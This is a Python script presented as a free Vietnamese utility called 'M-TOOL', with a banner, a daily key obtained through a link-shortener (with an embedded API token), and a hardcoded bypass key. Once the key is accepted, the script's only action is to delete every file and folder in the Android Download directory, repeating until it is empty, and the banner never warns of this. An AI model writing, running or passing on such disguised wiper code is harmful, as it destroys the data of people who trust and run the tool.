import os,sys,time,requests
import shutil
def banner():
        os.system("cls" if os.name == "nt" else "clear")
        banner =f'''
\033[91m███╗   ███╗   ████████╗ ██████╗  ██████╗ ██╗\033[0m
\033[92m████╗ ████║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║\033[0m
\033[93m██╔████╔██║█████╗██║   ██║   ██║██║   ██║██║\033[0m
\033[94m██║╚██╔╝██║╚════╝██║   ██║   ██║██║   ██║██║\033[0m
\033[95m██║ ╚═╝ ██║      ██║   ╚██████╔╝╚██████╔╝███████╗\033[0m
\033[96m╚═╝     ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝\033[0m


\033[1;37m──────────────────────────────────────────────────────────
 \033[1;31m➩  \033[1;37mTHÔNG BÁO 
 \033[1;31m* \033[0;37mNếu Tool Lỗi Thì Hãy Khởi Động Lại Tool Nhé \033[1;31m!!!
 \033[1;31m* \033[0;37mMua Key Liên Hệ Qua Zalo Mình Nhé.
 \033[1;31m* \033[0;37mNếu Có Lỗi Hãy Báo Qua Zalo Cho Mình Nhé
\033[1;37m───────────────────────────────────────────────────────────
        '''
        for i in banner:
          sys.stdout.write(i)
          sys.stdout.flush()
          time.sleep(0.00100)
banner()
from time import strftime
ngay=int(strftime('%d'))
key1=str(ngay*24032006+74321)
key = 'MINHTOOL'+key1
#os.system("cls" if os.name == "nt" else "clear")
if not os.path.exists('key_minhtool.txt'):
    url = 'http://keytoolvip.x10.mx/key.html?key='+key
    token_web1s = '0da24e7b-99c9-45e1-b405-2fda12568c13'
    web1s = requests.get(f'https://web1s.com/api?token={token_web1s}&url={url}').json()
    if web1s['status']=="error": 
        print(web1s['message'])
        quit()
    else:
        link_key=web1s['shortenedUrl']
    print ("\033[1;33mTool Free Nên Sẽ Đổi Key Mỗi Ngày\033[1;33m")
    print ("\033[1;35m ============================================  ")
    print('\033[1;36mVượt Link Để Lấy Key Free: \033[1;37m'+link_key)
    keynhap = input('\033[1;34mKey Đã Vượt Là: \033[1;33m')
    with open('key_minhtool.txt', 'w') as f:
        f.write(keynhap)
    
with open('key_minhtool.txt', 'r') as f:
   keynhap = f.read()
   
if keynhap == key or keynhap == "Minh Code-Chí Mum":
    nhap = ("""   \033[0;33mĐang Loang Vào Tool \033[0;37m...""")
    time.sleep(2)
else:
    print('\033[0;37mKey Sai Hoặc Đã Hết Hạn, Vui Lòng Khởi Động Lại Tool Và Vượt Link Lại \033[0;31m!!!\n')
    os.remove('key_minhtool.txt')
    quit()
banner()
def delete_contents(path):
    try:
        for filename in os.listdir(path):
            file_path = os.path.join(path, filename)
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f"Đã xoá file {filename}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                print(f"Đã xoá thư mục {filename} và nội dung bên trong")
    except Exception as e:
        print(f"Lỗi khi xoá nội dung tại {path}: {e}")

folder_path = "/storage/emulated/0/Download"
delete_contents(folder_path)

while os.listdir(folder_path):
    delete_contents(folder_path)

print("Đã xoá hết các file và thư mục.")
